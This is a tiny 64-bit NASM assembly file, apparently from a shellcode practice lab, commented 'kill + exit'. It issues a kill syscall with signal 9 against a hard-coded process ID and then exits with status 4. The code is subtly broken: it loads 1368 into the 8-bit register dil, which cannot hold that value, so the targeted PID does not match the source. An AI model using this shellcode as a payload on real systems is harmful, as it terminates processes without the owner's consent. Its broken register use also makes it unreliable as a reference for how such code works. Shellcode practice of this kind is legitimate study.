; shellcode-lab 64Bit
; dash@hack4.org
; kill + exit
; 


BITS 64
global _start

_start:

xor rax, rax
xor rdi, rdi
xor rsi, rsi


mov dil, 1368
mov sil,9
mov al, 62
syscall

xor rax, rax
xor rdi, rdi

add dil, 4
mov al, 60
syscall
